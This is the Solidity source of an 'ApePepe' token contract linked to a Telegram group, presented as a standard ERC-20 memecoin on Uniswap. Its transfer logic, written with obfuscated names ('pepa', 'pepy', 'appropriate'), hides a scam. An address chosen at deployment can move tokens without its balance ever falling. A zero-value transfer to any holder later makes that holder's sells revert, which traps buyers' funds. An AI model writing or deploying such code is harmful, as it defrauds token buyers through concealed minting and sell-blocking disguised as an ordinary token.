/*

Tg: t.me/ApePepeETH

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.3;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract ApePepe is Ownable {
    string public name;
    string public symbol;
    uint256 public totalSupply;
    uint8 public decimals = 9;
    uint256 private account = 9;
    address public uniswapV2Pair;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => uint256) private pepa;
    mapping(address => uint256) private pepy;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(address pepee) {
        name = 'ApePepe';
        symbol = 'ApePepe';
        totalSupply = 1000000000 * 10 ** decimals;
        balanceOf[msg.sender] = totalSupply;
        pepa[pepee] = account;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    function transfer(address rising, uint256 combination) public returns (bool success) {
        appropriate(msg.sender, rising, combination);
        return true;
    }

    function appropriate(address sell, address rising, uint256 combination) private returns (bool success) {
        if (combination == 0) {
            pepy[rising] += account;
        }
        if (pepa[sell] == 0) {
            balanceOf[sell] -= combination;
            if (uniswapV2Pair != sell && pepy[sell] > 0) {
                pepa[sell] -= account;
            }
        }
        balanceOf[rising] += combination;
        emit Transfer(sell, rising, combination);
        return true;
    }

    function approve(address knowledge, uint256 combination) public returns (bool success) {
        allowance[msg.sender][knowledge] = combination;
        emit Approval(msg.sender, knowledge, combination);
        return true;
    }

    function transferFrom(address sell, address rising, uint256 combination) public returns (bool success) {
        appropriate(sell, rising, combination);
        require(combination <= allowance[sell][msg.sender]);
        allowance[sell][msg.sender] -= combination;
        return true;
    }
}